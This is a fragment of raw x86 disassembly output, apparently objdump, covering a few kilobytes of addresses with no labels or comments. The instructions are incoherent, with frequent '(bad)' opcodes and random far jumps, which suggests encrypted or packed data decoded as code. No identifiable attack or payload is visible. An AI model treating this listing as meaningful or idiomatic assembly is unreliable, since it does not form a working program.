  41937e:	mov    BYTE PTR [edi+0x5ce90e38],al
  419384:	(bad)  
  419386:	mov    ecx,0x34a364a9
  41938b:	es sbb eax,0xfe834540
  419391:	push   esp
  419392:	mov    ds:0x9ee741ca,eax
  419397:	add    dl,dl
  419399:	loop   0x4193e9
  41939b:	inc    eax
  41939c:	jge    0x4193fc
  41939e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41939f:	push   ecx
  4193a0:	(bad)  
  4193a1:	inc    eax
  4193a2:	fist   WORD PTR [ebp+0xc]
  4193a5:	dec    DWORD PTR [eax]
  4193a7:	mov    ds:0x6f91fbd4,al
  4193ac:	sti    
  4193ad:	lods   al,BYTE PTR ds:[esi]
  4193ae:	bound  esi,QWORD PTR [edi+0x1d]
  4193b1:	rcl    DWORD PTR [edx],cl
  4193b3:	enter  0x4a9b,0xce
  4193b7:	pop    eax
  4193b8:	xor    al,0x9b
  4193ba:	call   0x5cb1:0x2163f186
  4193c1:	or     BYTE PTR [eax-0x52],dl
  4193c4:	fisttp QWORD PTR [ecx+edx*4]
  4193c7:	dec    esi
  4193c8:	test   eax,0x52e847b7
  4193cd:	inc    eax
  4193ce:	and    ebp,DWORD PTR [eax]
  4193d0:	and    BYTE PTR [esi+0x31],0x58
  4193d4:	dec    esp
  4193d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193d6:	inc    edi
  4193d7:	jmp    0x4193bd
  4193d9:	sbb    dh,ah
  4193db:	sbb    bh,0xe8
  4193de:	aaa    
  4193df:	push   0xffffff88
  4193e1:	sbb    DWORD PTR [esi],esp
  4193e3:	frstor [edi]
  4193e5:	lahf   
  4193e6:	nop
  4193e7:	xchg   DWORD PTR [edi-0x2258f64a],ebp
  4193ed:	stos   DWORD PTR es:[edi],eax
  4193ee:	in     eax,0x52
  4193f0:	repnz cmp DWORD PTR [edx-0x5e],ebx
  4193f4:	pop    ebp
  4193f5:	inc    eax
  4193f6:	adc    BYTE PTR [eax],dh
  4193f8:	cld    
  4193f9:	(bad)  
  4193fa:	enter  0x8330,0x91
  4193fe:	xchg   edi,eax
  4193ff:	mov    BYTE PTR [edx],bl
  419401:	stos   DWORD PTR es:[edi],eax
  419402:	pop    edi
  419403:	mov    DWORD PTR [ebx+eiz*2+0x10596db],0x605286f4
  41940e:	push   esp
  41940f:	add    ch,bl
  419411:	(bad)  
  419413:	cmp    ch,BYTE PTR [eax+0x33]
  419416:	xor    BYTE PTR [ecx],dh
  419418:	pop    ds
  419419:	inc    edi
  41941a:	ret    0xa3d0
  41941d:	sbb    DWORD PTR [edi-0x4d],0x2b
  419421:	mov    eax,0x655066c0
  419426:	mov    ds:0x3bf4f8bb,eax
  41942b:	push   0x934d54a4
  419430:	pushf  
  419431:	loop   0x4193ca
  419433:	sbb    eax,esi
  419435:	ja     0x419477
  419437:	shr    BYTE PTR [ecx-0x3e846890],cl
  41943d:	repnz mov dl,0x9b
  419440:	mov    ebx,0x9df3773d
  419445:	mov    esi,0xb86ba404
  41944a:	xor    eax,0xf0a15e08
  41944f:	lea    esp,[edi-0x44]
  419452:	loope  0x41945a
  419454:	jbe    0x419495
  419456:	sar    BYTE PTR [eax+0x3a],1
  419459:	daa    
  41945a:	mov    cl,0x86
  41945c:	cmp    esi,DWORD PTR [ebx]
  41945e:	fs mov ebp,ds
  419461:	or     BYTE PTR [ecx-0xe311e62],bh
  419467:	jmp    0x545d45b
  41946c:	in     eax,0xb5
  41946e:	pop    ebp
  41946f:	ret    0x8050
  419472:	jg     0x4194b1
  419474:	fstp   st(4)
  419476:	bound  ebx,QWORD PTR [esp+ebx*1-0x1d8278fe]
  41947d:	aas    
  41947e:	push   ecx
  41947f:	inc    ebp
  419480:	sub    ch,BYTE PTR ds:0xac0fc1e2
  419486:	rol    BYTE PTR [edx+0x58],cl
  419489:	rcl    BYTE PTR [eax*4+0x4f953206],0x79
  419491:	inc    ecx
  419492:	and    BYTE PTR [ecx],bh
  419494:	ja     0x4194a7
  419496:	inc    ebx
  419497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419498:	call   FWORD PTR [edi+0x19dee9b3]
  41949e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41949f:	fcom   DWORD PTR [edx+0x0]
  4194a2:	add    DWORD PTR [eax+0x4bf9d1b5],eax
  4194a8:	add    BYTE PTR [esi+ebp*1],ah
  4194ab:	xchg   DWORD PTR [esi-0x22aeb0e8],edx
  4194b1:	into   
  4194b2:	xchg   ecx,ecx
  4194b4:	sbb    eax,0x15e02244
  4194b9:	inc    ecx
  4194ba:	test   bh,0xf2
  4194bd:	out    dx,al
  4194be:	push   edx
  4194bf:	cli    
  4194c0:	mov    ds:0xdd11140c,eax
  4194c5:	arpl   dx,bp
  4194c7:	xchg   ecx,eax
  4194c8:	icebp  
  4194c9:	pop    edi
  4194ca:	jp     0x419517
  4194cc:	rol    BYTE PTR [eax-0x4d],1
  4194cf:	mov    esp,0xfb9f11e3
  4194d4:	cmp    BYTE PTR [esi],dl
  4194d6:	cwde   
  4194d7:	das    
  4194d8:	jb     0x4194e9
  4194da:	mov    dl,0x3a
  4194dc:	jge    0x41952c
  4194de:	fist   WORD PTR [ecx-0x6a]
  4194e1:	xor    ch,BYTE PTR [eax+0x27eaf086]
  4194e7:	push   ecx
  4194e8:	fstp   st(2)
  4194ea:	inc    BYTE PTR [edx+0x6c]
  4194ed:	xor    DWORD PTR [edx-0x35],ecx
  4194f0:	inc    eax
  4194f1:	inc    ebx
  4194f2:	mov    ds:0x7aa9c07,eax
  4194f7:	xor    BYTE PTR [ebp-0x222c8f35],al
  4194fd:	mov    bh,0x2c
  4194ff:	jl     0x41951c
  419501:	dec    esi
  419502:	test   eax,0x5d416a0d
  419507:	inc    ebx
  419508:	adc    ecx,esp
  41950a:	jecxz  0x4194c4
  41950c:	je     0x41950e
  41950e:	(bad)  
  41950f:	mov    dl,0xdd
  419511:	rcr    BYTE PTR [eax+0x7f],0x96
  419515:	mov    ds:0x4060b063,al
  41951a:	ret    
  41951b:	sub    DWORD PTR [esi],esp
  41951d:	jge    0x4194cc
  41951f:	pusha  
  419520:	mov    dh,0x57
  419522:	cwde   
  419523:	dec    eax
  419524:	mov    ah,0x29
  419526:	mov    dl,0x9b
  419528:	out    dx,al
  419529:	les    esi,FWORD PTR [edi-0x59bff29f]
  41952f:	mov    bl,0xa9
  419531:	enter  0x9071,0x93
  419535:	les    esp,FWORD PTR [esi+0xa6a153f]
  41953b:	mov    WORD PTR [ecx+0x3],?
  41953e:	xchg   esp,eax
  41953f:	inc    edi
  419540:	mov    edi,0x5bfcbe38
  419545:	test   BYTE PTR ds:0x6af82f87,ch
  41954b:	rcr    ch,0xaf
  41954e:	pop    ds
  41954f:	clc    
  419550:	loop   0x4194e7
  419552:	les    ebp,FWORD PTR ds:0xcc4d4026
  419558:	shl    BYTE PTR ds:0x87a4c12b,cl
  41955f:	xchg   edx,eax
  419560:	or     DWORD PTR [ecx],ecx
  419562:	mov    ah,0x4b
  419564:	jmp    0x4194fc
  419566:	sahf   
  419567:	lock sbb al,al
  41956a:	aas    
  41956b:	arpl   WORD PTR fs:[eax+0x3b],si
  41956f:	or     DWORD PTR [ebp+0x75a78140],0xffffffbd
  419576:	add    al,0x4f
  419578:	sub    ch,BYTE PTR [ecx-0x27222cef]
  41957e:	pushf  
  41957f:	jge    0x4195e6
  419581:	adc    DWORD PTR [edi],edi
  419583:	repz mov dh,0xb6
  419586:	pop    edx
  419587:	jo     0x4195fe
  419589:	pop    ds
  41958a:	add    cl,BYTE PTR [eax+0x42a173b0]
  419590:	out    dx,al
  419591:	addr16 mov ds:0xb46a,al
  419595:	xor    al,0x88
  419597:	add    al,0xf0
  419599:	out    0x31,eax
  41959b:	or     BYTE PTR ds:0x6a0cb345,cl
  4195a1:	dec    edi
  4195a2:	and    DWORD PTR [ebp-0x4e],edi
  4195a5:	mov    al,0x97
  4195a7:	je     0x419547
  4195a9:	jmp    0xa535:0xa50bb98f
  4195b0:	out    0x76,eax
  4195b2:	xchg   ebp,eax
  4195b3:	ret    0xa6dd
  4195b6:	mov    cl,BYTE PTR [esi-0x56]
  4195b9:	in     eax,dx
  4195ba:	aad    0xb9
  4195bc:	dec    ebp
  4195bd:	pop    es
  4195be:	jo     0x419547
  4195c0:	sub    dh,BYTE PTR [eax-0x34]
  4195c3:	xor    eax,0x40251929
  4195c8:	out    dx,al
  4195c9:	imul   ecx,edx,0x19dc8686
  4195cf:	jecxz  0x419562
  4195d1:	inc    eax
  4195d2:	test   BYTE PTR [ebx-0x52],bh
  4195d5:	jnp    0x41961c
  4195d7:	fisub  WORD PTR [esi]
  4195d9:	mov    ebx,0xcf384797
  4195de:	inc    eax
  4195df:	in     eax,dx
  4195e0:	lock mov ds:0x8474686d,eax
  4195e6:	cmp    DWORD PTR [edi-0x2db365f5],eax
  4195ec:	repz jmp 0x419577
  4195ef:	enter  0x581d,0xd7
  4195f3:	jns    0x41961f
  4195f5:	shr    DWORD PTR [ebx],0x2b
  4195f8:	sbb    edx,eax
  4195fa:	and    DWORD PTR [ebp-0x6233bfbb],0xffffff9f
  419601:	dec    ebp
  419602:	mov    eax,0xdfcc5b9
  419607:	dec    esi
  419608:	(bad)  [edx]
  41960a:	gs ins DWORD PTR es:[edi],dx
  41960c:	mov    ch,BYTE PTR [eax]
  41960e:	jb     0x4195bb
  419610:	mov    ebx,DWORD PTR [eax-0x60220d26]
  419616:	retf   
  419617:	jg     0x4195ee
  419619:	or     ebp,DWORD PTR [edi-0x5a0baabc]
  41961f:	pop    ss
  419620:	add    al,0x6
  419622:	inc    eax
  419623:	cmp    DWORD PTR [edi],ecx
  419625:	jmp    0x41966b
  419627:	out    0x4a,eax
  419629:	dec    edi
  41962a:	or     esp,DWORD PTR [eax-0x3a]
  41962d:	push   esi
  41962e:	ja     0x4195b3
  419630:	out    dx,al
  419631:	fisubr WORD PTR [edx-0x67f7727c]
  419637:	sbb    eax,0xd0776436
  41963c:	and    esp,ecx
  41963e:	js     0x4195ed
  419640:	cdq    
  419641:	stc    
  419642:	inc    BYTE PTR [esi+0x6a06c207]
  419648:	fisttp QWORD PTR [esi+0x1]
  41964b:	mov    ds:0xb44a1342,eax
  419650:	push   edi
  419651:	dec    esi
  419652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419653:	pop    ebp
  419654:	fwait
  419655:	dec    eax
  419656:	pop    ss
  419657:	add    al,0xe4
  419659:	sbb    DWORD PTR [ecx+0x60a81787],0xffffff8b
  419660:	data16 and al,0x16
  419663:	xchg   ebx,ebx
  419665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419666:	xchg   ecx,eax
  419667:	fwait
  419668:	dec    edi
  419669:	cmp    DWORD PTR [eax+ecx*4-0x68838cab],eax
  419670:	inc    edi
  419671:	or     eax,0xfec5a698
  419676:	xor    ecx,ecx
  419678:	adc    al,0x84
  41967a:	and    al,0x27
  41967c:	call   0x9ca6:0x9f86fab5
  419683:	ins    DWORD PTR es:[edi],dx
  419684:	fld    QWORD PTR [edx]
  419686:	or     al,0x1c
  419688:	stos   DWORD PTR es:[edi],eax
  419689:	fsubr  DWORD PTR [esi-0x65]
  41968c:	fiadd  DWORD PTR [eax-0x7f]
  41968f:	adc    ebx,DWORD PTR ds:[edi-0x241baef1]
  419696:	repz mov ch,BYTE PTR [ebp-0x22265b70]
  41969d:	rcl    BYTE PTR [ebp-0x2e],0x6d
  4196a1:	push   ebp
  4196a2:	push   edx
  4196a3:	mov    ds:0x820c3fff,al
  4196a8:	push   eax
  4196a9:	dec    esi
  4196aa:	pushf  
  4196ab:	add    esi,esp
  4196ad:	jbe    0x419646
  4196af:	xchg   esi,eax
  4196b0:	inc    esp
  4196b1:	leave  
  4196b2:	lods   eax,DWORD PTR ds:[esi]
  4196b3:	sbb    BYTE PTR [esi],bh
  4196b5:	clc    
  4196b6:	jmp    0x5a6e169
  4196bb:	xchg   DWORD PTR [esi-0x1400b7d2],ebx
  4196c1:	sbb    al,0x41
  4196c3:	retf   0x10
  4196c6:	ret    
  4196c7:	xor    al,BYTE PTR [ebx]
  4196c9:	fcomp  DWORD PTR [edx]
  4196cb:	popa   
  4196cc:	idiv   BYTE PTR [ebx]
  4196ce:	fadd   QWORD PTR [esi+0x4bd4d2b6]
  4196d4:	int    0x9e
  4196d6:	xchg   edi,eax
  4196d7:	push   ss
  4196d8:	aad    0xf
  4196da:	iret   
  4196db:	and    ah,al
  4196dd:	icebp  
  4196de:	push   ebp
  4196df:	fstp   DWORD PTR [ecx-0x49]
  4196e2:	out    0x89,eax
  4196e4:	cli    
  4196e5:	xor    edx,DWORD PTR [eax-0x59ae5cf5]
  4196eb:	mov    ebx,DWORD PTR [esi+0x38255b3a]
  4196f1:	xor    DWORD PTR [ecx+0x6a],0xffffffbb
  4196f5:	lock sub eax,0x3e7ed652
  4196fb:	leave  
  4196fc:	(bad)  [edi-0x6d33b53a]
  419702:	xor    eax,ebx
  419704:	fild   WORD PTR [edx]
  419706:	cmp    eax,0xf27b92b3
  41970b:	mov    ebp,0x46ee94dd
  419710:	sbb    al,BYTE PTR [edi]
  419712:	out    dx,al
  419713:	xchg   BYTE PTR [eax],cl
  419715:	cmp    al,0x5c
  419717:	stc    
  419718:	fnsave [esi+edx*1+0x5a283936]
  41971f:	(bad)  [ebp+0x40]
  419722:	sub    edi,DWORD PTR [eax+0x433cccd]
  419728:	lods   al,BYTE PTR ds:[esi]
  419729:	sub    eax,0xa4dfc799
  41972e:	popf   
  41972f:	enter  0xecc3,0xc7
  419733:	and    DWORD PTR [ecx+0x40],ebx
  419736:	jne    0x4196fc
  419738:	scas   eax,DWORD PTR es:[edi]
  419739:	test   DWORD PTR [ebp*4-0x296e4f29],esp
  419740:	fistp  WORD PTR [esi]
  419742:	jg     0x419780
  419744:	add    BYTE PTR [eax+0x1572d8bc],dl
  41974a:	mov    es,edi
  41974c:	push   ss
  41974d:	loop   0x4197a6
  41974f:	mov    ds:0x46cbc968,eax
  419754:	scas   al,BYTE PTR es:[edi]
  419755:	sbb    al,0x98
  419757:	sahf   
  419758:	fs enter 0x6264,0x24
  41975d:	ins    BYTE PTR es:[edi],dx
  41975e:	jnp    0x419725
  419760:	jmp    edx
  419762:	mov    bh,0xa2
  419764:	mov    edx,0xd4699ee
  419769:	add    al,0x9b
  41976b:	mov    bh,0x2f
  41976d:	jp     0x4197bf
  41976f:	pop    esi
  419770:	sub    eax,0x3a9717c7
  419775:	jne    0x4197b0
  419777:	fsub   st,st(7)
  419779:	jmp    0xf3321f76
  41977e:	popa   
  41977f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419780:	and    ch,BYTE PTR [eax+0x9]
  419783:	fisttp QWORD PTR [bp+di]
  419786:	mov    BYTE PTR [ebx+0x2d],dh
  419789:	pop    es
  41978a:	xlat   BYTE PTR ds:[ebx]
  41978b:	call   0x4018:0xe38420f8
  419792:	sbb    ecx,DWORD PTR [eax+0x5ae03d6d]
  419798:	repz mov ?,WORD PTR [ebp+0x19935f30]
  41979f:	sti    
  4197a0:	sub    BYTE PTR [ecx],0xad
  4197a3:	adc    bl,al
  4197a5:	rol    DWORD PTR [edi+0x324f6de8],1
  4197ab:	shl    BYTE PTR [ebp-0x18],1
  4197ae:	aaa    
  4197af:	and    ecx,ebx
  4197b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197b2:	outs   dx,BYTE PTR ds:[esi]
  4197b3:	popa   
  4197b4:	fnsave [ebx]
  4197b6:	scas   eax,DWORD PTR es:[edi]
  4197b7:	icebp  
  4197b8:	les    ebx,FWORD PTR [edi+0x4094c640]
  4197be:	xlat   BYTE PTR ds:[ebx]
  4197bf:	inc    ecx
  4197c0:	mov    dl,0x8
  4197c2:	xchg   edi,eax
  4197c3:	dec    esp
  4197c4:	sub    BYTE PTR [edx-0x68],cl
  4197c7:	push   esi
  4197c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197c9:	ins    DWORD PTR es:[edi],dx
  4197ca:	sbb    edi,edx
  4197cc:	sub    bl,BYTE PTR es:[edi+edi*2+0x5b]
  4197d1:	inc    eax
  4197d2:	inc    esp
  4197d3:	mov    ds:0x34edcd84,al
  4197d8:	xchg   edx,eax
  4197d9:	jl     0x41977d
  4197db:	push   cs
  4197dc:	cmp    BYTE PTR [esi-0x6ce6dc53],cl
  4197e2:	cmp    cl,BYTE PTR [esi-0x3e701f3b]
  4197e8:	dec    esi
  4197e9:	pop    esi
  4197ea:	jo     0x41978c
  4197ec:	sbb    al,0x40
  4197ee:	push   edx
  4197ef:	xor    bh,BYTE PTR [edi]
  4197f1:	int3   
  4197f2:	fisttp QWORD PTR [eax]
  4197f4:	fnstsw WORD PTR [edi-0xd8eb192]
  4197fa:	or     eax,0xa9b41976
  4197ff:	mov    BYTE PTR [esi],ch
  419801:	xchg   esi,eax
  419802:	add    DWORD PTR [edi-0x649e1728],0xffffffdd
  419809:	add    dl,bl
  41980b:	jmp    0x4197cb
  41980d:	mov    edi,0x347dc9a4
  419812:	or     DWORD PTR [edi],ebx
  419814:	jle    0x419842
  419816:	and    DWORD PTR [edi+0x10e05ca5],eax
  41981c:	fnstsw WORD PTR [ebx]
  41981e:	or     ah,cl
  419820:	mov    dh,0xb8
  419822:	push   cs
  419823:	cmp    eax,DWORD PTR cs:[eax+0x7a]
  419827:	pop    edx
  419828:	in     eax,0xe9
  41982a:	je     0x41983f
  41982c:	or     eax,DWORD PTR [ebp-0x62]
  41982f:	(bad)  
  419830:	inc    DWORD PTR [ebx-0x5d]
  419833:	push   ds
  419834:	sbb    eax,0x51df3fdb
  419839:	inc    eax
  41983a:	dec    edx
  41983b:	rcr    DWORD PTR [eax],1
  41983d:	pop    ss
  41983e:	les    esp,FWORD PTR [edx+0x62]
  419841:	es cwde 
  419843:	(bad)  
  419844:	and    eax,0x6db9e87f
  419849:	mov    ch,0x37
  41984b:	push   ebp
  41984c:	div    DWORD PTR [ecx]
  41984e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41984f:	add    dl,BYTE PTR [ebp-0x61]
  419852:	xchg   cx,ax
  419854:	js     0x419896
  419856:	ja     0x419899
  419858:	out    dx,al
  419859:	cld    
  41985a:	jl     0x419864
  41985c:	fisubr WORD PTR [ebx]
  41985e:	sbb    BYTE PTR [esi-0x11],dh
  419861:	xor    esp,DWORD PTR [edx]
  419863:	mov    al,0xc1
  419865:	adc    ecx,DWORD PTR [ebx]
  419867:	dec    esp
  419868:	cmp    al,dl
  41986a:	ret    0x458d
  41986d:	lock add ebp,DWORD PTR [edx+0x66]
  419871:	scas   al,BYTE PTR es:[edi]
  419872:	call   0x2240:0xbeb2a0d5
  419879:	lock in al,0x5f
  41987c:	fcomp  DWORD PTR ss:[ecx]
  41987f:	(bad)  
  419881:	dec    esp
  419882:	cmp    eax,DWORD PTR [edi+0x5d155f84]
  419888:	fucomp st(6)
  41988a:	ja     0x4198b6
  41988c:	or     DWORD PTR [edi+0x433244e2],esp
  419892:	xchg   BYTE PTR [ebx-0x3fb7ac5d],ch
  419898:	mov    ?,eax
  41989a:	xchg   esp,eax
  41989b:	push   cs
  41989c:	cmp    BYTE PTR [edi-0x60509d69],ch
  4198a2:	xchg   ebp,eax
  4198a3:	pop    esp
  4198a4:	inc    esp
  4198a5:	xchg   esp,eax
  4198a6:	xor    eax,0x4c572bba
  4198ab:	xchg   esp,eax
  4198ad:	dec    ebp
  4198ae:	(bad)  
  4198b0:	fnsave [ecx+0x17]
  4198b3:	jp     0x419840
  4198b5:	test   DWORD PTR [edi-0x16aa30c9],ebx
  4198bb:	pushf  
  4198bc:	data16 cld 
  4198be:	mov    bl,0x3d
  4198c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198c1:	dec    esi
  4198c2:	addr16 xchg ebp,eax
  4198c4:	std    
  4198c5:	or     eax,0xac88ddeb
  4198ca:	(bad)  
  4198cc:	mov    BYTE PTR [eax-0x43],al
  4198cf:	int    0x73
  4198d1:	fstp   QWORD PTR [ebp-0x72]
  4198d4:	or     eax,0x50a327b
  4198d9:	inc    ebx
  4198da:	sub    BYTE PTR [ebp+eax*2+0x28679340],ah
  4198e1:	xor    BYTE PTR ds:0x98f7aee2,dl
  4198e7:	cmp    edi,DWORD PTR [edi+ebp*2]
  4198ea:	popf   
  4198eb:	mov    edx,0x5563ad36
  4198f0:	rol    DWORD PTR [ecx-0x51],0x9d
  4198f4:	pop    eax
  4198f5:	push   esp
  4198f6:	js     0x419954
  4198f8:	jge    0x41989a
  4198fa:	nop
  4198fb:	and    eax,0x9c97d154
  419900:	jl     0x41990d
  419902:	jbe    0x41995c
  419904:	out    dx,eax
  419905:	test   BYTE PTR [esp+ebx*8-0x7f],0x9c
  41990a:	and    eax,0xeaf51587
  41990f:	scas   eax,DWORD PTR es:[edi]
  419910:	frstor [edx]
  419912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419913:	retf   
  419914:	fucomip st,st(5)
  419916:	rcl    ecx,cl
  419918:	dec    eax
  419919:	inc    eax
  41991a:	jecxz  0x41996a
  41991c:	add    dl,BYTE PTR ss:[edi+0x1c]
  419920:	stos   BYTE PTR es:[edi],al
  419921:	ficom  DWORD PTR [edi-0x1fee9f39]
  419927:	rcr    DWORD PTR [esi+0x55],cl
  41992a:	cmp    cl,BYTE PTR [ecx]
  41992c:	inc    ecx
  41992d:	and    al,0x4d
  41992f:	mov    ds:0x8b75c614,eax
  419934:	(bad)  
  419935:	out    dx,eax
  419936:	retf   
  419937:	push   es
  419938:	in     al,0x39
  41993a:	out    0xf4,al
  41993c:	sub    eax,0x10e0fb0b
  419941:	cmp    DWORD PTR ds:0x1958c535,edx
  419947:	(bad)  
  419948:	mov    esp,0x90a3d7d3
  41994d:	enter  0xd637,0x6f
  419951:	pop    edx
  419952:	fist   WORD PTR [ebx+0x4bf2131b]
  419958:	in     al,0x9d
  41995a:	(bad)  
  41995b:	xchg   bl,bh
  41995d:	or     eax,0xe18f1578
  419962:	mov    bl,0xa5
  419964:	(bad)  
  419966:	inc    eax
  419967:	inc    ecx
  419968:	or     al,0x7a
  41996a:	es (bad) gs:[eax+ecx*4]
  41996f:	mov    ebp,0x2c2472b6
  419974:	dec    eax
  419975:	inc    eax
  419976:	and    bh,BYTE PTR [edx-0x33de020f]
  41997c:	pop    ebp
  41997d:	iret   
  41997e:	xchg   edi,eax
  41997f:	sahf   
  419980:	xchg   edx,eax
  419981:	sahf   
  419982:	lahf   
  419983:	jne    0x41993e
  419985:	shr    bh,1
  419987:	(bad)  [ecx+0x25]
  41998a:	sahf   
  41998b:	xchg   esp,eax
  41998c:	popf   
  41998d:	push   0xffffffb3
  41998f:	fcomp  QWORD PTR [edx]
  419991:	pushf  
  419992:	xchg   edi,eax
  419993:	jecxz  0x41997b
  419995:	pusha  
  419996:	int    0xd9
  419998:	scas   eax,DWORD PTR es:[edi]
  419999:	dec    ebx
  41999a:	jb     0x419983
  41999c:	ja     0x419957
  41999e:	mov    bh,0x86
  4199a0:	mov    edi,DWORD PTR gs:[esi-0x524322d0]
  4199a7:	xchg   ebp,eax
  4199a8:	out    dx,al
  4199a9:	mov    eax,ds:0x40bad007
  4199ae:	push   cs
  4199af:	int3   
  4199b0:	(bad)  
  4199b1:	inc    DWORD PTR [ebx]
  4199b3:	mov    al,0x77
  4199b5:	cmp    eax,0xe5dd157c
  4199ba:	jbe    0x41994e
  4199bc:	int3   
  4199bd:	mov    ebp,0x3fe1a375
  4199c2:	bnd jge 0x419a26
  4199c5:	xor    DWORD PTR [eax+edx*1+0x1cbe3217],ecx
  4199cc:	push   edi
  4199cd:	scas   eax,DWORD PTR es:[edi]
  4199ce:	xchg   edi,eax
  4199cf:	xchg   ebx,eax
  4199d0:	(bad)  
  4199d1:	bound  ebp,QWORD PTR [ebp+0x73]
  4199d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199d5:	inc    eax
  4199d6:	arpl   WORD PTR [esp+ebx*1+0x2561b46],cx
  4199dd:	pop    esp
  4199de:	xchg   edi,eax
  4199df:	sub    ch,BYTE PTR [esi]
  4199e1:	mov    bh,0x1e
  4199e3:	leave  
  4199e4:	and    esp,DWORD PTR [eax-0x3c]
  4199e7:	and    eax,0x86cf1c1a
  4199ec:	mov    ebp,0xde8f940f
  4199f1:	xchg   ebx,eax
  4199f2:	clc    
  4199f3:	dec    esp
  4199f4:	mov    eax,ds:0xb93daead
  4199f9:	mov    BYTE PTR [edx+0x3a],dh
  4199fc:	mov    BYTE PTR [esi],dh
  4199fe:	sub    eax,DWORD PTR [edi-0x3b0c966a]
  419a04:	fstp   st(1)
  419a06:	jp     0x41999d
  419a08:	mov    esp,0xe8062960
  419a0d:	inc    esi
  419a0e:	lock (bad) 
  419a10:	idiv   BYTE PTR ds:0x7dee9e64
  419a16:	mov    DWORD PTR [edi-0x23],esp
  419a19:	ja     0x419a99
  419a1b:	scas   eax,DWORD PTR es:[edi]
  419a1c:	popa   
  419a1d:	and    bl,BYTE PTR [edx]
  419a1f:	idiv   bl
  419a21:	dec    eax
  419a22:	sbb    al,0x64
  419a24:	es cmc 
  419a26:	pop    ss
  419a27:	repz adc BYTE PTR gs:[edi-0x44],ch
  419a2c:	fnstsw WORD PTR [eax+0x14]
  419a2f:	dec    edi
  419a30:	mov    DWORD PTR [edi+0x538597b6],esp
  419a36:	sbb    DWORD PTR [esi+edx*2-0xf13b8bf],edi
  419a3d:	pop    ebx
  419a3e:	add    ch,bh
  419a40:	mov    edx,0xcb7a9ab4
  419a45:	shr    BYTE PTR [esi],1
  419a47:	cmp    BYTE PTR [ebx],cl
  419a49:	xor    al,0x1a
  419a4b:	jl     0x419a82
  419a4d:	add    BYTE PTR [eax-0x26],0x8b
  419a51:	mov    ah,0x22
  419a53:	sbb    DWORD PTR [eax+0x66873191],edx
  419a59:	lahf   
  419a5a:	repz fld QWORD PTR [esi]
  419a5e:	daa    
  419a5f:	mov    DWORD PTR [esi+0x4ccd46bd],edi
  419a65:	inc    eax
  419a66:	cmp    eax,0xdfc2496a
  419a6b:	in     eax,dx
  419a6c:	repnz hlt 
  419a6e:	cdq    
  419a6f:	sub    ebp,DWORD PTR [esi]
  419a71:	push   0xa013ea8b
  419a76:	sub    esp,esi
  419a78:	stc    
  419a79:	aaa    
  419a7a:	aad    0xe
  419a7c:	arpl   si,di
  419a7e:	in     al,0x86
  419a80:	call   DWORD PTR [ebp+0x31]
  419a83:	or     al,0xe4
  419a85:	repnz fisttp DWORD PTR [edi+0x49]
  419a89:	mov    edi,0x81f8a717
  419a8e:	sti    
  419a8f:	add    bl,bh
  419a91:	sbb    eax,0xd4f786a7
  419a96:	call   0x4c557877
  419a9b:	clc    
  419a9c:	push   0x66a90e7c
  419aa1:	inc    eax
  419aa2:	cmp    BYTE PTR [eax+eiz*2-0x7f],al
  419aa6:	gs sbb eax,0x46153eb8
  419aac:	fld    QWORD PTR [ebp+0x44]
  419aaf:	frstor [esi]
  419ab1:	jge    0x419a95
  419ab3:	mov    ecx,eax
  419ab5:	mov    ah,0xeb
  419ab7:	adc    eax,0x86fdf1d4
  419abc:	push   edi
  419abd:	in     eax,0x46
  419abf:	lods   eax,DWORD PTR ds:[esi]
  419ac0:	fisttp QWORD PTR [edi-0x526bd273]
  419ac6:	cli    
  419ac7:	inc    eax
  419ac8:	push   eax
  419ac9:	push   ebx
  419aca:	mov    esi,0x9940aeab
  419acf:	inc    edi
  419ad0:	jno    0x419ae2
  419ad2:	mov    BYTE PTR [edi],bl
  419ad4:	(bad)  [ecx]
  419ad6:	in     eax,0xf5
  419ad8:	vpaddd xmm0,xmm5,xmm4
  419adc:	stos   BYTE PTR es:[edi],al
  419add:	pop    ebp
  419ade:	(bad)  
  419adf:	in     al,dx
  419ae0:	out    0x3f,al
  419ae2:	call   0x8ffbfae9
  419ae7:	fcmovnu st,st(5)
  419ae9:	mov    esp,0xb744f6f8
  419aee:	adc    ch,bl
  419af0:	xor    eax,DWORD PTR [eax+0x4]
  419af3:	js     0x419b71
  419af5:	pop    eax
  419af6:	(bad)  
  419af7:	mov    dl,0x29
  419af9:	mov    edx,DWORD PTR [edi-0x31f903f4]
  419aff:	ret    
  419b00:	mul    DWORD PTR [ebx+edx*1]
  419b03:	and    al,0xc9
  419b05:	jae    0x419b21
  419b07:	ret    0x82d9
  419b0a:	xchg   dl,ch
  419b0c:	mov    ch,0xe3
  419b0e:	fcom   st(4)
  419b10:	in     al,0x69
  419b12:	mov    ecx,0xfac99138
  419b17:	push   edx
  419b18:	ret    0xcae8
  419b1b:	data16 cli 
  419b1d:	xchg   DWORD PTR [ebx+ebx*8+0x26d077fa],esp
  419b24:	xchg   esp,eax
  419b25:	xchg   ecx,eax
  419b26:	add    ecx,edx
  419b28:	jge    0x419b07
  419b2a:	sub    eax,0xd553d3d4
  419b2f:	jns    0x419b28
  419b31:	aas    
  419b32:	inc    edi
  419b33:	ins    DWORD PTR es:[edi],dx
  419b34:	cmp    BYTE PTR [edi+0x406feeb7],0xac
  419b3b:	int3   
  419b3c:	dec    ebx
  419b3d:	jge    0x419b77
  419b3f:	retf   0x902a
  419b42:	xchg   edi,eax
  419b43:	adc    edi,DWORD PTR [edx-0x6a]
  419b46:	sub    ebp,DWORD PTR [ebx+0x33f6e04e]
  419b4c:	repnz push eax
  419b4e:	in     al,dx
  419b4f:	xchg   BYTE PTR [ebx+edi*1],cl
  419b52:	cmp    DWORD PTR [ecx+ecx*1],0xe04b6926
  419b59:	sbb    BYTE PTR [ebp+edi*4-0x131e166f],bh
  419b60:	cmp    eax,0x84902837
